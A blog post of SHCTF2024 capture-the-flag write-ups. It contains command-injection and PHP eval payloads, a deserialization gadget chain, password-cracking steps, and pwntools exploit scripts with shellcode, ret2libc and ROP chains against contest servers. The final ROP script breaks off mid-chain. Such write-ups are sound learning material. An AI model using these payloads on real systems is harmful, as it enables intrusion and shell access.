---
layout:     post
title:      SHCTF2024 WriteUp
subtitle:   记录一下
date:       2024-10-31
author:     Aaron
header-img: img/vagabond.jpg
catalog: true
tags:
    - Rev
    - WriteUp

---

# Web

## [Week1]1zflask

进来是404 not found

![a3394d46350dc44c13f16473f452f668](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/a3394d46350dc44c13f16473f452f668.png)

根据题目描述访问/robots.txt

![12adfe8edae69c17254c8f7c38ae0947](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/12adfe8edae69c17254c8f7c38ae0947.png)

访问得到app.py

```Python
import os
import flask
from flask import Flask, request, send_from_directory, send_file

app = Flask(__name__)

@app.route('/api')
def api():
    cmd = request.args.get('SSHCTFF', 'ls /')
    result = os.popen(cmd).read()
    return result
    
@app.route('/robots.txt')
def static_from_root():
    return send_from_directory(app.static_folder,'robots.txt')
    
@app.route('/s3recttt')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
 
if __name__ == '__main__':
    app.run(debug=True)
```

比较明显

访问/api会自动执行ls /

![37923b9e820bf3f3c20f84141e24f7f4](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/37923b9e820bf3f3c20f84141e24f7f4.png)

传参?SSHCTFF=cat /flag即可

## [Week1]单身十八年的手速

查看js代码

整理一下

可以看到明显的base64编码，解码即可

![ee3bfb1145e25bcf5921459178bd85bf](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/ee3bfb1145e25bcf5921459178bd85bf.png)

## [Week1]蛐蛐?蛐蛐!

查看源代码可以看到提示

![1c8eb8286fd37d28720174e67e0bafbe](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/1c8eb8286fd37d28720174e67e0bafbe.png)

访问/source.txt

```JavaScript
<?php
if($_GET['ququ'] == 114514 && strrev($_GET['ququ']) != 415411){
    if($_POST['ququ']!=null){
        $eval_param = $_POST['ququ'];
        if(strncmp($eval_param,'ququk1',6)===0){
            eval($_POST['ququ']);
        }else{
            echo("可以让fault的蛐蛐变成现实么\n");
        }
    }
    echo("蛐蛐成功第一步！\n");

}
else{
    echo("呜呜呜fault还是要出题");
}
```

第一个if用?ququ=114514a即可

![178bcb0151c22ce59d994c15ddba349a](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/178bcb0151c22ce59d994c15ddba349a.png)

接下来post传参ququ

前面六个字符需要为ququk1

后面用|运算符即可

ququ=ququk1|system('cat /f*');

![1127c0870e552163157ba5862a9de1f7](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/1127c0870e552163157ba5862a9de1f7.png)

## [Week1]poppopop

源代码：

```JavaScript
<?php 
class SH { 

    public static $Web = false; 
    public static $SHCTF = false; 
} 
class C { 
    public $p; 

    public function flag() 
    { 
        ($this->p)(); 
    } 
} 
class T{ 

    public $n; 
    public function __destruct() 
    { 

        SH::$Web = true; 
        echo $this->n; 
    } 
} 
class F { 
    public $o; 
    public function __toString() 
    { 
        SH::$SHCTF = true; 
        $this->o->flag(); 
        return "其实。。。。,"; 
    } 
} 
class SHCTF { 
    public $isyou; 
    public $flag; 
    public function __invoke() 
    { 
        if (SH::$Web) { 

            ($this->isyou)($this->flag); 
            echo "小丑竟是我自己呜呜呜~"; 
        } else { 
            echo "小丑别看了!"; 
        } 
    } 
} 
if (isset($_GET['data'])) { 
    highlight_file(__FILE__); 
    unserialize(base64_decode($_GET['data'])); 
} else { 
    highlight_file(__FILE__); 
    echo "小丑离我远点！！！"; 
}
```

比较简单的反序列化

exp：

```Python
<?php
class SH {
    public static $Web = false;
    public static $SHCTF = false;
}
class C {
    public $p;
}
class T{

    public $n;
}
class F {
    public $o;
}
class SHCTF {
    public $isyou="system";
    public $flag="cat /f*";
}
$a = new T();
$b = new F();
$a->n=$b;
$c = new C();
$b->o=$c;
$d = new SHCTF();
$c->p=$d;
$t=serialize($a);
echo($t."\n");
echo (base64_encode($t));
```

## [Week1]jvav

用java写一个简单的可以执行命令的程序即可

还不太懂java，于是去网上找了一个

```JavaScript
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class demo {
    public static void main(String[] args) throws IOException {
        InputStream in =Runtime.getRuntime().exec("cat /flag").getInputStream();

        ByteArrayOutputStream byteArrayOutputStream  = new ByteArrayOutputStream();
        byte[] b = new byte[1024];
        int a = -1;

        while ((a  = in.read(b))!= -1){
            byteArrayOutputStream.write(b,0,a);
        }
        System.out.println(byteArrayOutputStream.toString());
    }
}
```

## [Week1]ez_gittt

可以用dirsearch扫一下

发现是git泄露(其实题目名字也告诉我们了)

![2592182dad0c0d7e1159ba29c6ab51bb](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/2592182dad0c0d7e1159ba29c6ab51bb.png)

使用处理git泄露的工具git_extract

命令：

python2 git_extract.py url/.git/

用python3会报错就换python2

![48cac87aba57920e1b6709eb1be28e13](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/48cac87aba57920e1b6709eb1be28e13.png)

该命令会把/.git/下个版本的文件恢复

可以看到恢复了/flag

恢复的文件会放到该工具所在目录的entry.shc.tf_49410文件夹下

![99c99831308f96ca0b43137ff75921ac](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/99c99831308f96ca0b43137ff75921ac.png)

打开flag文件即可

## [Week1]MD5 Master

```JavaScript
<?php 
highlight_file(__file__); 

$master = "MD5 master!"; 

if(isset($_POST["master1"]) && isset($_POST["master2"])){ 
    if($master.$_POST["master1"] !== $master.$_POST["master2"] && md5($master.$_POST["master1"]) === md5($master.$_POST["master2"])){ 
        echo $master . "<br>"; 
        echo file_get_contents('/flag'); 
    } 
} 
else{ 
    die("master? <br>"); 
}
```

代码的意思比较明显，就是post传入master1和master2后会在其前面加上"MD5 master!"进行对比

如果本身的值不相等，但是md5加密后相等则输出flag

利用工具fastcoll进行md5强碰撞

建一个txt文件，内容为MD5 master!

直接把txt拉到exe里，会自动执行

![6ef140d77a5baf2b1132f27fcde90e2b](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/6ef140d77a5baf2b1132f27fcde90e2b.png)

用exe执行后生成两个文件

![c3aa4934ce3ca1e1d354f4c3c1289299](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/c3aa4934ce3ca1e1d354f4c3c1289299.png)

![ca0acab5f7a895c1857550c78d8aa452](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/ca0acab5f7a895c1857550c78d8aa452.png)

但此时两个txt文件都是乱码

找个脚本将两个文件进行url编码即可

![0012e4c84a7340ef9d0a794a34efa12e](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/0012e4c84a7340ef9d0a794a34efa12e.png)

传参即可（注意别把!编码后的%21传上去了）

![a2b2e50d8e9fda67221deffff9e0377c](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/a2b2e50d8e9fda67221deffff9e0377c.png)

# Misc

## **[Week1]签到题**

**扫码二维码关注公众号发送信息得到flag**

![e9ea2cd9e612d985ba1d1016dfc8e93d](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/e9ea2cd9e612d985ba1d1016dfc8e93d.png)

## **[Week1]真真假假?遮遮掩掩!**

首先得到一个压缩包，解压是看到有一串掩码，以为要掩码攻击，

![f67016c49ef83ac065413d41c09fc8c9](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/f67016c49ef83ac065413d41c09fc8c9.png)

但是可以直接解压，然后下一个压缩包还是有这一串掩码、

![56b62c4a2ada9762c0b869c2b1dc0358](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/56b62c4a2ada9762c0b869c2b1dc0358.png)

所以直接掩码攻击得到密码打开压缩包

![c241d94a57f38b2b68e5fc0730e0991c](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/c241d94a57f38b2b68e5fc0730e0991c.png)

打开得到flag

![image-20241031084119376](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084119376.png)

## [Week1]拜师之旅①

首先得到一张打不开的图片，放进010看

![img](C:/Users/Aar0n/AppData/Local/Temp/msohtmlclip1/01/clip_image002.gif)

缺失头文件，加上89504e470d0a1a0a

![img](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/clip_image004.gif)

可以打开图片，然后看图片，发现图片宽高不对，一把梭修复得到flag

![image-20241031084152185](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084152185.png)

## [Week1]Rasterizing Traffic

 

![img](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/clip_image002.gif)

导出一张图片

![img](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/clip_image004.gif)

光栅脚本解密

## [Week1]有WiFi干嘛不用呢？

首先把may里面的文件里的东西全部提取出了成为一个文本

![img](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/clip_image002.gif)

然后用aircrack-ng跑得到密码

![img](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/clip_image004.jpg)

 

## [Week1]Quarantine

Windows 隔离文件 使用rc4加密

```Python
from pathlib import Path

# File path provided by the user
quarantine_file_path = Path("./5760650163482280EF03C48A97277F7E490A0761")

# RC4 key for decryption (hardcoded in the provided code)
DEFENDER_QUARANTINE_RC4_KEY = [
    0x1E, 0x87, 0x78, 0x1B, 0x8D, 0xBA, 0xA8, 0x44, 0xCE, 0x69, 0x70, 0x2C, 0x0C, 0x78, 0xB7, 0x86, 0xA3, 0xF6, 0x23,
    0xB7, 0x38, 0xF5, 0xED, 0xF9, 0xAF, 0x83, 0x53, 0x0F, 0xB3, 0xFC, 0x54, 0xFA, 0xA2, 0x1E, 0xB9, 0xCF, 0x13, 0x31,
    0xFD, 0x0F, 0x0D, 0xA9, 0x54, 0xF6, 0x87, 0xCB, 0x9E, 0x18, 0x27, 0x96, 0x97, 0x90, 0x0E, 0x53, 0xFB, 0x31, 0x7C,
    0x9C, 0xBC, 0xE4, 0x8E, 0x23, 0xD0, 0x53, 0x71, 0xEC, 0xC1, 0x59, 0x51, 0xB8, 0xF3, 0x64, 0x9D, 0x7C, 0xA3, 0x3E,
    0xD6, 0x8D, 0xC9, 0x04, 0x7E, 0x82, 0xC9, 0xBA, 0xAD, 0x97, 0x99, 0xD0, 0xD4, 0x58, 0xCB, 0x84, 0x7C, 0xA9, 0xFF,
    0xBE, 0x3C, 0x8A, 0x77, 0x52, 0x33, 0x55, 0x7D, 0xDE, 0x13, 0xA8, 0xB1, 0x40, 0x87, 0xCC, 0x1B, 0xC8, 0xF1, 0x0F,
    0x6E, 0xCD, 0xD0, 0x83, 0xA9, 0x59, 0xCF, 0xF8, 0x4A, 0x9D, 0x1D, 0x50, 0x75, 0x5E, 0x3E, 0x19, 0x18, 0x18, 0xAF,
    0x23, 0xE2, 0x29, 0x35, 0x58, 0x76, 0x6D, 0x2C, 0x07, 0xE2, 0x57, 0x12, 0xB2, 0xCA, 0x0B, 0x53, 0x5E, 0xD8, 0xF6,
    0xC5, 0x6C, 0xE7, 0x3D, 0x24, 0xBD, 0xD0, 0x29, 0x17, 0x71, 0x86, 0x1A, 0x54, 0xB4, 0xC2, 0x85, 0xA9, 0xA3, 0xDB,
    0x7A, 0xCA, 0x6D, 0x22, 0x4A, 0xEA, 0xCD, 0x62, 0x1D, 0xB9, 0xF2, 0xA2, 0x2E, 0xD1, 0xE9, 0xE1, 0x1D, 0x75, 0xBE,
    0xD7, 0xDC, 0x0E, 0xCB, 0x0A, 0x8E, 0x68, 0xA2, 0xFF, 0x12, 0x63, 0x40, 0x8D, 0xC8, 0x08, 0xDF, 0xFD, 0x16, 0x4B,
    0x11, 0x67, 0x74, 0xCD, 0x0B, 0x9B, 0x8D, 0x05, 0x41, 0x1E, 0xD6, 0x26, 0x2E, 0x42, 0x9B, 0xA4, 0x95, 0x67, 0x6B,
    0x83, 0x98, 0xDB, 0x2F, 0x35, 0xD3, 0xC1, 0xB9, 0xCE, 0xD5, 0x26, 0x36, 0xF2, 0x76, 0x5E, 0x1A, 0x95, 0xCB, 0x7C,
    0xA4, 0xC3, 0xDD, 0xAB, 0xDD, 0xBF, 0xF3, 0x82, 0x53
]

def rc4_crypt(data: bytes) -> bytes:
    """RC4 encrypt / decrypt using the Defender Quarantine RC4 Key."""
    sbox = list(range(256))
    j = 0
    for i in range(256):
        j = (j + sbox[i] + DEFENDER_QUARANTINE_RC4_KEY[i]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]

    out = bytearray(len(data))
    i = 0
    j = 0
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + sbox[i]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]
        val = sbox[(sbox[i] + sbox[j]) % 256]
        out[k] = val ^ data[k]

    return bytes(out)

# Read the quarantine file and decrypt its contents
with quarantine_file_path.open("rb") as file:
    encrypted_data = file.read()

# Decrypt the data using the RC4 function
decrypted_data = rc4_crypt(encrypted_data)

# Save the decrypted output for inspection
output_path = quarantine_file_path.with_suffix(".decrypted")
with output_path.open("wb") as decrypted_file:
    decrypted_file.write(decrypted_data)

print(output_path)
```

![image-20241031084300658](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084300658.png)

将base64解密之后是一个Zip压缩包

![image-20241031084315081](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/image-20241031084315081.png)

下载下来之后有密码

跑一下rockyou字典即可得到密码解压得到flag

# Rev

## [Week1]ezxor

```Python
data = [0xC3, 0x69, 0x72, 0xC4, 0x67, 0x4A, 0xE8, 0x11, 0x43, 0xCF,
  0x6F, 0x00, 0xF3, 0x44, 0x6E, 0xF8, 0x59, 0x49, 0xE8, 0x4E,
  0x5E, 0xE2, 0x53, 0x43, 0xB1, 0x5C]


for i in range(len(data)):
    j = i % 3
    if j == 1:
        data[i] = data[i] ^ 0x21
    elif j == 2:
        data[i] = data[i] ^ 0x31
    elif j == 0:
        data[i] = data[i] ^ 0x90
    print(chr(data[i]), end='')
```

## [Week1]gamegame

```Python
import numpy as np

sudoku_puzzle = np.array([
    [5, 3, 0, 0, 7, 0, 0, 0, 0],
    [6, 0, 0, 1, 9, 5, 0, 0, 0],
    [0, 9, 8, 0, 0, 0, 0, 6, 0],
    [8, 0, 0, 0, 6, 0, 0, 0, 3],
    [4, 0, 0, 8, 0, 3, 0, 0, 1],
    [7, 0, 0, 0, 2, 0, 0, 0, 6],
    [0, 6, 0, 0, 0, 0, 2, 8, 0],
    [0, 0, 0, 4, 1, 9, 0, 0, 5],
    [0, 0, 0, 0, 8, 0, 0, 7, 9]
])

def is_safe(board, row, col, num):
    if num in board[row] or num in board[:, col]:
        return False

    start_row, start_col = 3 * (row // 3), 3 * (col // 3)
    if num in board[start_row:start_row+3, start_col:start_col+3]:
        return False

    return True


def solve_sudoku(board):
    for row in range(9):
        for col in range(9):
            if board[row, col] == 0:
                for num in range(1, 10):
                    if is_safe(board, row, col, num):
                        board[row, col] = num
                        if solve_sudoku(board):
                            return True
                        board[row, col] = 0
                return False
    return True


solve_sudoku(sudoku_puzzle)
print(sudoku_puzzle)
```

## [Week1]ezrc4

```Python
def init_sbox(key):
    sbox = list(range(256))
    j = 0
    key_len = len(key)

    for i in range(256):
        j = (j + sbox[i] + key[i % key_len]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]
    return sbox

def rc4_decrypt(ciphertext, key):
    sbox = init_sbox(key)
    i = j = 0
    plaintext = []

    for byte in ciphertext:
        i = (i + 1) % 256
        j = (j + sbox[i]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]
        k = sbox[(sbox[i] + sbox[j]) % 256]
        plaintext.append(byte ^ k ^ 0x66)

    return bytes(plaintext)

result = [
    0x21,0xab,0x3f,0x42,0x65,0x8f,0x3c,0x5b,0xc,0x17,0x5,0x6e,0x84,0xe7,0x1a,0x69,0xc3,0x77,0x70,0x1f,0x11
]

key = b"FenKey!!"

decrypted_result = rc4_decrypt(result, key)

print(decrypted_result.decode('utf-8', errors='ignore'))
```

## [Week1]ezapk

```Python
import base64

encoded_str = "woLDgMOgw7hEwoJQw7zDtsKow7TDpMOMZMOow75QxIbDnsKmw6Z4UMK0w7rCklDCrMKqwqbDtMOOw6DDsg=="
key = [12, 15, 25, 30, 36]

decoded_bytes = base64.b64decode(encoded_str)

decoded_chars = [char for char in decoded_bytes.decode('utf-8')]
original_chars = []

for i, char in enumerate(decoded_chars):
    char_value = ord(char) // 2 - 6
    original_char = chr(char_value ^ key[i % len(key)])
    original_chars.append(original_char)

flag = ''.join(original_chars)
print(flag)
```

## [Week1]ezDBG

![1f23b4d99be3fc3e8a28d6625ce29b93](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/1f23b4d99be3fc3e8a28d6625ce29b93.png)

![8395d93a51768ac158c1da718acf4c33](https://cdn.jsdelivr.net/gh/Aar0n3906/blog-img/8395d93a51768ac158c1da718acf4c33.png)

# Pwn

## [Week1] 指令执行器

```Python
from pwn import *
from struct import pack
from ctypes import *
#from LibcSearcher import *
import base64
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))
def pre():
    print(p.recv())
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
context(log_level='debug',arch='amd64', os='linux')
#p = process('./pwn')
p = remote('210.44.150.15',45200)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27.so')
#gdb.attach(p, 'b *0x04007A8')
#gdb.attach(p,'b *$rebase(0x13BD)')  #'b *$rebase(0x123456)'
#context(arch='amd64', os='linux')

#exp
sla('Please enter the instruction length:',b'512')
shellcode=asm('''
xor rdi,rdi
lea rsi, [rsp+0x50]
mov rdx, 0x100
mov r10, rcx
sub r10, 17
call r10
call rsi
''')
#pay0 = b'a'*(0x138)
sla('Please enter the instruction:',shellcode)
pause()
s('\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05')
p.interactive()
```

## [Week1] 签个到吧

```Python
from pwn import *
from struct import pack
from ctypes import *
#from LibcSearcher import *
import base64
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))
def pre():
    print(p.recv())
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
context(log_level='debug',arch='amd64', os='linux')
#p = process('./pwn')
p = remote('entry.shc.tf',33717)
#elf = ELF('./pwn')
#libc = ELF('./libc-2.27.so')
#gdb.attach(p, 'b *0x04007A8')
#gdb.attach(p,'b *$rebase(0x19E8)')  #'b *$rebase(0x123456)'
#context(arch='amd64', os='linux')

#exp
sa('test command',b'exec 1>&0 && ca\\t f*')
p.interactive()
```

## [Week1]No stack overflow1

```Python
from pwn import *
from struct import pack
from ctypes import *
#from LibcSearcher import *
import base64
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))
def pre():
    print(p.recv())
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
context(log_level='debug',arch='amd64', os='linux')
#p = process('./pwn')
p = remote('entry.shc.tf',44867)
#elf = ELF('./pwn')
#libc = ELF('./libc-2.27.so')
#gdb.attach(p, 'b *0x04007A8')
#gdb.attach(p,'b *$rebase(0x19E8)')  #'b *$rebase(0x123456)'
#context(arch='amd64', os='linux')

#exp
pay = b'\x00'+b'a'*(0x117)+p64(0x4012D0)+p64(0x4011D6)
sla('>>>',pay)
p.interactive()
```

## [Week1]No stack overflow2

```Python
from pwn import *
from struct import pack
from ctypes import *
#from LibcSearcher import *
import base64
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))
def pre():
    print(p.recv())
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
context(log_level='debug',arch='amd64', os='linux')
#p = process('./pwn')
p = remote('entry.shc.tf',38095)
elf = ELF('./vuln (1)')
#libc = ELF('./libc-2.27.so')
#gdb.attach(p, 'b *0x04007A8')
#gdb.attach(p,'b *$rebase(0x19E8)')  #'b *$rebase(0x123456)'
#context(arch='amd64', os='linux')

#exp
rdi = 0x401223
ret = 0x40101a
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

sla('size: ',b'-1')
pay0 = b'a'*(0x108)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(0x401228)
sa('input: ',pay0)
puts_addr = get_addr()
print('puts_addr->',hex(puts_addr))
libc_addr =puts_addr - 0x80e50
sys_addr = libc_addr + 0x50d70
sh_addr = libc_addr +0x1d8678

sla('size: ',b'-1')
pay1 = b'a'*(0x108)+p64(ret)+p64(rdi)+p64(sh_addr)+p64(sys_addr)
sa('input: ',pay1)
p.interactive()
```

## [Week1]No stack overflow2 pro

```Python
from pwn import *
from struct import pack
from ctypes import *
#from LibcSearcher import *
import base64
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))
def pre():
    print(p.recv())
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)
context(log_level='debug',arch='amd64', os='linux')
#p = process('./pwn')
r = remote('entry.shc.tf',23569)
#elf = ELF('./No_stack_overflow2')
#libc = ELF('./libc-2.27.so')
#gdb.attach(p, 'b *0x04007A8')
#gdb.attach(p,'b *$rebase(0x19E8)')  #'b *$rebase(0x123456)'
#context(arch='amd64', os='linux')

#exp
r.sendlineafter('size: ',b'2147483648')
p = b'a'*(0x108)
p += pack('<Q', 0x000000000040a32e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e50e0) # @ .data
p += pack('<Q', 0x00000000004507f7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x0000000000452d55) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040a32e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e50e8) # @ .data + 8
p += pack('<Q', 0x0000000000445570) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000452d55) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004022bf) # pop rdi ; ret
p += pack('<Q', 0x00000000004e50e0) # @ .data
p += pack('<Q', 0x000000000040a32e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e50e8) # @ .data + 8
p += pack('<Q', 0x000000000049d06b) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004e50e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x0000000000445570) # xor rax, rax ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
